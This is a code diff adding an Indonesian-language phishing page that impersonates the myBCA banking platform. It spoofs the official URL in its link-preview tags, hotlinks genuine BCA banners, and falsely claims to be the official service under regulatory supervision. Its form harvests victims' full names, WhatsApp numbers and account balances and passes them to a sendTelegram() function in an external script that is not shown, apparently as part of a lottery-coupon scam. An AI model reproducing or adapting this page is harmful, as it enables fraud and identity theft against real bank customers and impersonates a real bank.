@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <title>myBCA</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="description" content="myBCA merupakan digital platform dari BCA dimana nasabah memerlukan single user ID untuk dapat mengakses seluruh informasi rekening.">
+
+  <!-- Open Graph Meta Tags (Meta Image & Preview untuk WhatsApp / Telegram) -->
+  <meta property="og:title" content="myBCA - Login & Pendaftaran">
+  <meta property="og:description" content="Layanan resmi platform digital myBCA untuk akses informasi rekening dan pendaftaran kupon undian.">
+  <meta property="og:image" content="https://i.ibb.co.com/NdG3NMvW/IMG-3004.png">
+  <meta property="og:url" content="https://mybca.bca.co.id/">
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="myBCA - Login & Pendaftaran">
+  <meta name="twitter:description" content="Layanan resmi platform digital myBCA untuk akses informasi rekening dan pendaftaran kupon undian.">
+  <meta name="twitter:image" content="https://i.ibb.co.com/NdG3NMvW/IMG-3004.png">
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #0d5cab 0%, #0094d6 50%, #00b6f1 100%);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      touch-action: pan-x pan-y;
+    }
+    #splash-screen {
+      background: linear-gradient(#0d5cab, #0094d6, #00b6f1);
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.4s ease;
+    }
+    #splash-screen .logo-wrapper {
+      width: 150px;
+      height: 45px;
+      position: relative;
+    }
+    #splash-screen .logo-base {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      opacity: 0.2;
+    }
+    #splash-screen .logo-progress {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 0%;
+      background: url("https://i.ibb.co.com/NdG3NMvW/IMG-3004.png") no-repeat left center;
+      background-size: 150px 45px;
+      overflow: hidden;
+      transition: width 0.1s linear;
+    }
+    .bca-input-line {
+      border-bottom: 1.5px solid #CBD5E1;
+      transition: all 0.2s ease;
+    }
+    .bca-input-line:focus-within {
+      border-bottom: 1.5px solid #005caa;
+    }
+    .slider-container {
+      position: relative;
+      overflow: hidden;
+      border-radius: 1rem;
+    }
+    .slide-item, .slide-item-p2 {
+      display: none;
+      width: 100%;
+    }
+    .slide-item.active, .slide-item-p2.active {
+      display: block;
+    }
+    .typing-cursor::after {
+      content: '|';
+      animation: blink 0.7s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+  </style>
+</head>
+<body class="p-4 md:p-8">
+
+  <!-- ================= SPLASH SCREEN / LOADING AWAL ================= -->
+  <div id="splash-screen">
+    <div class="logo-wrapper">
+      <img src="https://i.ibb.co.com/NdG3NMvW/IMG-3004.png" class="logo-base" alt="Loading">
+      <div id="logoProgress" class="logo-progress"></div>
+    </div>
+  </div>
+
+  <!-- ================= PAGE 1: FORM LOGIN ================= -->
+  <div id="page1" class="w-full flex flex-col justify-between min-h-[90vh]">
+    <header class="max-w-6xl mx-auto w-full flex justify-between items-center py-4">
+      <div class="flex items-center">
+        <img src="https://i.ibb.co.com/NdG3NMvW/IMG-3004.png" alt="myBCA Logo" style="width: 131px; height: 40px;">
+      </div>
+      <div class="bg-white/20 backdrop-blur-md rounded-full px-3 py-1 flex items-center text-white text-xs font-bold border border-white/30">
+        <span class="mr-2 w-4 h-4 rounded-full bg-red-600 inline-block border border-white"></span>
+        <span>ID</span>
+      </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto w-full grid grid-cols-1 lg:grid-cols-12 gap-6 my-auto">
+      <div class="lg:col-span-7 flex flex-col justify-center">
+        <div class="slider-container bg-white shadow-xl">
+          <div class="slide-item active"><img src="https://content.mybca.bca.co.id/general/mybca/banner/web/Konser_Tawa_2026_ID.jpg_2173.png" alt="Banner 1" class="w-full object-cover"></div>
+          <div class="slide-item"><img src="https://content.mybca.bca.co.id/general/mybca/banner/web/mybca_fitur_poket_rupi_0338.png" alt="Banner 2" class="w-full object-cover"></div>
+          <div class="slide-item"><img src="https://content.mybca.bca.co.id/general/mybca/banner/web/Treshold__8811.png" alt="Banner 3" class="w-full object-cover"></div>
+          <div class="slide-item"><img src="https://content.mybca.bca.co.id/general/mybca/banner/web/expo_extended_ID.jpg_3130.png" alt="Banner 4" class="w-full object-cover"></div>
+        </div>
+      </div>
+
+      <div class="lg:col-span-5">
+        <div class="bg-white rounded-2xl p-6 md:p-8 shadow-2xl">
+          <div class="bg-amber-50 border border-amber-200 rounded-lg py-1.5 px-2 mb-4 overflow-hidden shadow-inner">
+            <marquee behavior="scroll" direction="left" class="text-xs font-semibold text-amber-800">
+              ⚡ SELAMAT DATANG DI LAYANAN RESMI MYBCA • SILAHKAN ISI DATA DENGAN BENAR UNTUK MELANJUTKAN PROSES PENDAFTARAN ⚡
+            </marquee>
+          </div>
+
+          <div class="flex justify-between items-start mb-6">
+            <div>
+              <h4 class="text-2xl font-bold text-slate-800 m-0">Halo,</h4>
+              <h5 class="text-xl font-normal text-[#005caa] mt-0">Selamat Datang!</h5>
+            </div>
+            <a href="https://i.ibb.co.com/svYp3Ypy/IMG-3005.png" target="_blank" class="flex flex-col items-center text-center text-orange-600 text-xs font-bold">
+              <div class="w-12 h-12 mb-1"><img src="https://i.ibb.co.com/gLkfpRsq/IMG-3005.jpg" alt="bca-id-card" class="w-full h-full"></div>
+            </a>
+          </div>
+
+          <form id="bcaForm" onsubmit="sendTelegram(event);">
+            <div class="mb-5 bca-input-line pb-1">
+              <label class="block text-xs font-bold text-[#005caa] mb-1">Nama Lengkap</label>
+              <input id="inputNama" type="text" placeholder="Masukkan Nama Lengkap" oninput="validateForm()" class="w-full py-1.5 bg-transparent text-slate-800 font-semibold outline-none text-sm placeholder-slate-300"/>
+            </div>
+
+            <div class="mb-5 bca-input-line pb-1">
+              <div class="flex justify-between items-center mb-1">
+                <label class="block text-xs font-bold text-[#005caa]">Nomor WhatsApp</label>
+                <span id="waError" class="text-[10px] text-red-500 font-semibold hidden">Minimal 10 digit</span>
+              </div>
+              <input id="inputWA" type="tel" maxlength="13" placeholder="Contoh: 081234567890" oninput="formatWA(this); validateForm();" class="w-full py-1.5 bg-transparent text-slate-800 font-semibold outline-none text-sm placeholder-slate-300"/>
+            </div>
+
+            <div class="mb-6 bca-input-line pb-1">
+              <label class="block text-xs font-bold text-[#005caa] mb-1">Jumlah Saldo</label>
+              <input id="inputSaldo" type="tel" placeholder="Rp 0" oninput="formatSaldo(this); validateForm();" class="w-full py-1.5 bg-transparent text-slate-800 font-semibold outline-none text-sm placeholder-slate-300"/>
+            </div>
+
+            <div class="mt-6 text-center">
+              <button id="btnMasuk" type="submit" disabled class="w-full bg-[#c0c0c0] text-white font-bold py-3 rounded-full text-sm transition-all duration-200 cursor-not-allowed shadow-sm">
+                Masuk
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </main>
+
+    <footer class="max-w-6xl mx-auto w-full text-center text-white/80 text-xs py-4">
+      <span>BCA berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia.</span>
+    </footer>
+  </div>
+
+  <!-- ================= PAGE 2: HALAMAN SUKSES ================= -->
+  <div id="page2" class="hidden w-full flex-col justify-between min-h-[90vh]">
+    <header class="max-w-6xl mx-auto w-full flex justify-between items-center py-4">
+      <div class="flex items-center">
+        <img src="https://i.ibb.co.com/NdG3NMvW/IMG-3004.png" alt="myBCA Logo" style="width: 131px; height: 40px;">
+      </div>
+      <div class="bg-white/20 backdrop-blur-md rounded-full px-3 py-1 flex items-center text-white text-xs font-bold border border-white/30">
+        <span class="mr-2 w-4 h-4 rounded-full bg-red-600 inline-block border border-white"></span>
+        <span>ID</span>
+      </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto w-full grid grid-cols-1 lg:grid-cols-12 gap-6 my-auto">
+      <div class="lg:col-span-7 flex flex-col justify-center">
+        <div class="slider-container bg-white shadow-xl">
+          <div class="slide-item-p2 active"><img src="https://content.mybca.bca.co.id/general/mybca/banner/web/Konser_Tawa_2026_ID.jpg_2173.png" alt="Banner 1" class="w-full object-cover"></div>
+          <div class="slide-item-p2"><img src="https://content.mybca.bca.co.id/general/mybca/banner/web/mybca_fitur_poket_rupi_0338.png" alt="Banner 2" class="w-full object-cover"></div>
+          <div class="slide-item-p2"><img src="https://content.mybca.bca.co.id/general/mybca/banner/web/Treshold__8811.png" alt="Banner 3" class="w-full object-cover"></div>
+          <div class="slide-item-p2"><img src="https://content.mybca.bca.co.id/general/mybca/banner/web/expo_extended_ID.jpg_3130.png" alt="Banner 4" class="w-full object-cover"></div>
+        </div>
+      </div>
+
+      <div class="lg:col-span-5 flex flex-col justify-center">
+        <div class="bg-white rounded-2xl p-6 md:p-8 shadow-2xl text-center">
+          <div class="bg-[#005caa] border-2 border-white/60 rounded-xl p-6 shadow-inner">
+            <div id="typedText" class="text-white text-base md:text-lg font-semibold leading-relaxed typing-cursor text-center"></div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <footer class="max-w-6xl mx-auto w-full text-center text-white/80 text-xs py-4">
+      <span>BCA berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia.</span>
+    </footer>
+  </div>
+
+  
+  <script src="csst.js"></script>
+</body>
+</html>
